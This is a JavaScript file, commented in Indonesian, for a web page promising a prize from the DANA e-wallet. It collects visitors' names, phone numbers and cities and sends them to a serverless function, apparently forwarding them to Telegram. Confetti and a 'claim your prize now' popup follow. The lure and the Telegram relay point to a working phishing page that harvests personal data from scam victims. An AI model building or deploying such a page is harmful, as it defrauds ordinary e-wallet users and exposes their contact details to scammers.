// Konstanta API endpoint
const API_ENDPOINT = '/.netlify/functions/send-dana-data';

// Elemen DOM
const giftForm = document.getElementById('giftForm');
const submitBtn = document.getElementById('submitBtn');
const popupOverlay = document.getElementById('popupOverlay');
const whatsappBtn = document.getElementById('whatsappBtn');

// Fungsi utama saat formulir dikirim
async function handleFormSubmit(e) {
    e.preventDefault();
    
    // Validasi sederhana
    const nama = document.getElementById('nama').value;
    const hp = document.getElementById('hp').value;
    const kota = document.getElementById('kota').value;
    
    if(nama && hp && kota) {
        // Tampilkan loading state
        setButtonLoadingState(true);
        
        try {
            // Kirim data ke Netlify Function
            const response = await sendDataToTelegram({ nama, hp, kota });
            
            if (response.success) {
                // Tampilkan animasi konfeti
                createConfetti();
                
                // Update WhatsApp link dengan nomor pengguna
                updateWhatsAppLink(nama);
                
                // Tampilkan popup setelah delay
                setTimeout(showPopup, 800);
            } else {
                showError('Terjadi kesalahan: ' + (response.error || 'Gagal mengirim data'));
            }
        } catch (error) {
            console.error('Error:', error);
            showError('Terjadi kesalahan jaringan. Silakan coba lagi.');
        } finally {
            // Reset button state
            setButtonLoadingState(false);
        }
    } else {
        showError('Harap lengkapi semua data yang diperlukan.');
    }
}

// Fungsi untuk mengirim data ke Netlify Function
async function sendDataToTelegram(data) {
    try {
        const response = await fetch(API_ENDPOINT, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(data),
        });
        
        return await response.json();
    } catch (error) {
        console.error('Error sending data:', error);
        throw error;
    }
}

// Fungsi untuk mengatur state loading tombol
function setButtonLoadingState(isLoading) {
    if (isLoading) {
        submitBtn.innerHTML = '<span class="loader"></span> Mengirim data...';
        submitBtn.disabled = true;
    } else {
        submitBtn.innerHTML = '<i class="fas fa-paper-plane"></i> Klaim Hadiah Sekarang';
        submitBtn.disabled = false;
    }
}

// Fungsi untuk menampilkan error
function showError(message) {
    alert(message);
}

// Fungsi untuk menampilkan popup
function showPopup() {
    popupOverlay.classList.add('active');
}

// Fungsi untuk menutup popup
function closePopup() {
    popupOverlay.classList.remove('active');
    giftForm.reset();
}

// Fungsi untuk update link WhatsApp
function updateWhatsAppLink(nama) {
    const message = `Halo, saya ${encodeURIComponent(nama)} sudah mengklaim hadiah DANA`;
    whatsappBtn.href = `https://wa.me/?text=${message}`;
}

// Fungsi untuk membuat efek konfeti
function createConfetti() {
    const colors = ['#FFD700', '#8a64d6', '#4e54c8', '#FFA500', '#4b6cb7'];
    const container = document.querySelector('.container');
    
    for (let i = 0; i < 50; i++) {
        const confetti = document.createElement('div');
        confetti.className = 'confetti';
        confetti.style.left = Math.random() * 100 + '%';
        confetti.style.top = -20 + 'px';
        confetti.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
        confetti.style.transform = `rotate(${Math.random() * 360}deg)`;
        container.appendChild(confetti);
        
        const animationDuration = Math.random() * 2 + 2;
        
        // Animasi konfeti
        confetti.animate([
            { top: '-20px', transform: 'rotate(0deg)' },
            { top: '100%', transform: `rotate(${Math.random() * 720}deg)` }
        ], {
            duration: animationDuration * 1000,
            easing: 'cubic-bezier(0.1, 0.8, 0.3, 1)'
        });
        
        // Hapus elemen setelah animasi selesai
        setTimeout(() => {
            confetti.remove();
        }, animationDuration * 1000);
    }
}

// Event Listeners
function initEventListeners() {
    // Submit form
    if (giftForm) {
        giftForm.addEventListener('submit', handleFormSubmit);
    }
    
    // Close popup dengan tombol
    const closeButton = document.querySelector('.popup-close');
    if (closeButton) {
        closeButton.addEventListener('click', closePopup);
    }
    
    // Close popup ketika klik di luar area popup
    if (popupOverlay) {
        popupOverlay.addEventListener('click', function(e) {
            if (e.target === this) {
                closePopup();
            }
        });
    }
    
    // Validasi input nomor HP
    const hpInput = document.getElementById('hp');
    if (hpInput) {
        hpInput.addEventListener('input', function(e) {
            // Hanya allow angka
            e.target.value = e.target.value.replace(/\D/g, '');
        });
    }
}

// Inisialisasi saat DOM siap
document.addEventListener('DOMContentLoaded', function() {
    initEventListeners();
});

// Export fungsi untuk testing (jika diperlukan)
if (typeof module !== 'undefined' && module.exports) {
    module.exports = {
        handleFormSubmit,
        sendDataToTelegram,
        setButtonLoadingState,
        showError,
        showPopup,
        closePopup,
        updateWhatsAppLink,
        createConfetti
    };
        }
